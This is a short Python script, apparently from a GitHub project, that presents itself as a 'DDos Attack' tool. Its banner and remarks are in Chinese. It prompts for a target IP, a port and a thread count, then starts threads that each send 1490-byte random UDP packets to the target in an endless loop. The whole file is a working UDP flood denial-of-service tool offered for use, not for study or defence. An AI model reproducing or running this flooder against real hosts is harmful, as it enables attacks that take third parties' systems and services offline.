import sys
import os
import time
import random
import socket
from datetime import datetime
import threading

os.system("clear")
os.system("figlet DDos Attack")
print("--------------------------------------------")
print("|作者 : uynmodk                             |")
print("|git : https://github.com/uynmodk/ddos.git |")
print("|版本 : V1.0.0                              |")
print("--------------------------------------------")
print("")
print("注意: 本人已将显示已发送多少个数据包隐藏")
print("因为耗能巨高,如果开了显示就等于手机卡死")
print("同时,家里要有条件才可以将虚拟主机调高")
print("假设虚拟主机50个,几分钟后1000块就没了 ")
print("")
ip = input("目标IP:")
port = int(input("目标端口:"))
many = input("虚拟主机数量(注意不要太高,除非家里有条件):")

many = int(many)

def send_packets():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1490)
    sent = 0
    while True:
        sock.sendto(bytes_to_send, (ip, port))
        sent += 1

threads = []
for i in range(many):
    thread = threading.Thread(target=send_packets)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
